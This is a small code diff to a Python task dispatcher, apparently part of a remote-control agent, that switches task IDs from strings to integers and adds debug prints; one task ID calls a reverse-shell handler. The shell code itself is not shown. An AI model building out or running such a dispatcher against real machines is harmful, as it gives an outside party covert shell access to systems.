@@ -7,11 +7,13 @@ from handlers.ping import perform_task_ping
 from handlers.reverse_shell import perform_task_reverse_shell
 
 def select_task(task_id):
-    if task_id == "000":
+    print(type(task_id))
+    print(task_id)
+    if task_id == 0:
         print("Error in processing json payload")
-    elif task_id == "001":
+    elif task_id == 1:
         perform_task_ping()
-    elif task_id == "002":
+    elif task_id == 2:
         perform_task_reverse_shell()
     else:
         print("Error, incorrect task_id, could not be processed")
